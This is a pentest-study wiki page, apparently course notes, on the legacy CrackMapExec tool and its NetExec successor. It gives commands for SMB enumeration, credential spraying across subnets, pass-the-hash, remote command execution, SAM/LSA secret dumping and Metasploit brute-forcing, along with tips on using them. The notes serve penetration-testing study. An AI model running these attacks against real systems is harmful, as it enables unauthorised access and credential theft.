---
tags: [tool]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# crackmapexec (cme) — LEGACY

> **CrackMapExec is no longer actively maintained.** Use [[tools/netexec]] (`nxc`) instead — it is the direct successor with identical syntax. Replace `crackmapexec` with `nxc` in every command below and they work as-is.

CrackMapExec was a post-exploitation and enumeration tool for SMB, WinRM, MSSQL, LDAP, and RDP. Its active fork is [[tools/netexec]].

## Overview

CrackMapExec (CME / cme) automates credential testing and enumeration against Windows protocols at scale. It can spray credentials across an IP range, enumerate shares and users, execute commands, and dump hashes — all from a single tool.

Install:
```bash
sudo apt install crackmapexec
# or
pip3 install crackmapexec
```

Note: NetExec (`nxc`) is the active fork/successor of CrackMapExec as of 2024. Syntax is identical; use `nxc` if `cme` is not available.

## Commands / Syntax

```bash
# SMB — enumerate shares (null session)
crackmapexec smb 10.129.14.128 --shares -u '' -p ''

# SMB — enumerate with credentials
crackmapexec smb 10.129.14.128 --shares -u 'user' -p 'password'

# SMB — enumerate users
crackmapexec smb 10.129.14.128 --users -u '' -p ''

# SMB — enumerate groups
crackmapexec smb 10.129.14.128 --groups -u '' -p ''

# SMB — enumerate logged-on users
crackmapexec smb 10.129.14.128 --loggedon-users

# SMB — spray credentials across a subnet
crackmapexec smb 10.129.14.0/24 -u users.txt -p passwords.txt

# SMB — pass-the-hash
crackmapexec smb 10.129.14.128 -u Administrator -H :NTHASH

# SMB — execute command
crackmapexec smb 10.129.14.128 -u user -p pass -x 'whoami'

# WinRM — test credentials
crackmapexec winrm 10.129.14.128 -u user -p pass

# MSSQL — enumerate
crackmapexec mssql 10.129.14.128 -u sa -p ''

# MSSQL — execute SQL query
crackmapexec mssql 10.129.14.128 -u sa -p '' --local-auth -q "SELECT @@version"
```

## Flags & Options

### Global Flags

| Flag | Description |
|------|-------------|
| `-u <user>` | Username or file of usernames |
| `-p <pass>` | Password or file of passwords |
| `-H <hash>` | NTLM hash (pass-the-hash) |
| `--local-auth` | Use local account (not domain) |
| `--continue-on-success` | Don't stop after first successful login |
| `-t <N>` | Number of threads (default 100) |
| `-v` | Verbose |

### SMB-Specific

| Flag | Description |
|------|-------------|
| `--shares` | Enumerate shares |
| `--users` | Enumerate users |
| `--groups` | Enumerate groups |
| `--loggedon-users` | Show logged-on users |
| `--rid-brute` | RID brute-force user enumeration |
| `--pass-pol` | Dump password policy |
| `-x <command>` | Execute shell command |
| `-X <command>` | Execute PowerShell command |
| `--sam` | Dump SAM database |
| `--lsa` | Dump LSA secrets |

## Reading Output

```
SMB  10.129.14.128  445  DEVSMB  [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB  10.129.14.128  445  DEVSMB  [+] \:
SMB  10.129.14.128  445  DEVSMB  [+] Enumerated shares
SMB  10.129.14.128  445  DEVSMB  notes  READ,WRITE  CheckIT
```

- `[+]` = success
- `[-]` = failure
- `[*]` = informational
- `Pwn3d!` = user has admin privileges (appears after successful auth)
- `(signing:False)` = SMB signing not required → relay attacks possible

## CME vs Metasploit for Credential Attacks

CrackMapExec and Metasploit's `smb_login` both test SMB credentials but serve different purposes. Using the wrong one is the most common source of confusion.

| Need | Use | Why |
|------|-----|-----|
| Brute-force one account with rockyou.txt | **MSF smb_login** | Handles large files reliably; `STOP_ON_SUCCESS` halts as soon as it hits; proper threading control |
| Spray one password across many hosts/users | **CME** | Designed for this; fast across subnets; outputs `[+]` / `Pwn3d!` per host immediately |
| Validate known credentials | **CME** | Fastest credential tester across a /24; stores results in its DB |
| Brute-force with a large wordlist | **Hydra or MSF** | CME is unreliable with files over a few thousand entries |

**Why `crackmapexec smb <ip> -u user -p rockyou.txt` often fails:**
1. **rockyou.txt is gzipped on Kali/Parrot** — if you pass the `.gz` file, CME receives binary data as passwords and finds nothing. Always `gunzip` it first.
2. **CME is not a brute-forcer** — it iterates through the password file, but it has no `stop_on_success` equivalent, no built-in rate limiting, and is slow on large files.
3. **Thread count** — CME's default 100 threads on a large wordlist hammers the target and can trigger account lockout or IDS.

**When CME password lists DO work:** small curated lists (top-100 passwords, default credential files). CME is ideal for spraying `Password1!` across 200 hosts, not for finding one user's password from 14 million candidates.

```bash
# CME — correct use case: spray one password across a subnet
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success

# CME — correct use case: validate a found credential everywhere
crackmapexec smb 10.10.10.0/24 -u jason -p 'princess1' --continue-on-success

# MSF — correct use case: brute-force one account with rockyou
msf6> use auxiliary/scanner/smb/smb_login
msf6> set RHOSTS 10.10.10.10
msf6> set SMBUser jason
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set STOP_ON_SUCCESS true
msf6> set THREADS 3
msf6> run
```

## Gotchas & Notes

- **`(Pwn3d!)`** means the authenticated user has local admin rights — immediately prioritize this host.
- **SMB signing check**: `(signing:False)` indicates the host is vulnerable to NTLM relay attacks. Note all hosts without signing.
- **Account lockout**: Always check the password policy before spraying (`--pass-pol`). Locked accounts end engagements.
- **NetExec**: CrackMapExec development moved to NetExec (`nxc`). Syntax is identical — replace `crackmapexec` with `nxc`.
- **`--continue-on-success`**: Without this flag, CME stops after the first valid credential match per host. Always use it when spraying.
- **`--no-bruteforce`**: With multiple `-u` and `-p` entries, CME by default tries every user+password combination (cartesian product). `--no-bruteforce` pairs them 1:1 instead (user1:pass1, user2:pass2).
- **Database**: CME stores results in a local SQLite database. Query with `crackmapexec smb --creds` to review historical results.

## Related Pages

- [[enumeration/smb]]
- [[enumeration/mssql]]
- [[enumeration/windows_remote_mgmt]]
- [[tools/smbclient]]
- [[tools/impacket]]

## Sources

- raw/footprinting/host_based_enumeration_smb.md
